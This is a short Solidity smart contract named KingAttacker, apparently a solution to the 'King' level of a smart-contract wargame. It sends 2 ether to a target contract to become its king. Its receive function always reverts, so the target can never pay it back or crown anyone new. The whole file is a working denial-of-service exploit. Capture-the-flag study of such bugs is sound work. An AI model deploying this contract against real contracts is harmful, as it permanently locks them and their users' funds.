// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

contract KingAttacker {
    address king;

    constructor(address _king) {
        king = _king;
    }

    function attack() public payable {
        require(msg.value == 2 ether);
        (bool success,) = king.call{value: 2 ether}("");
        require(success);
    }

    receive() external payable {
        revert();
    }
}
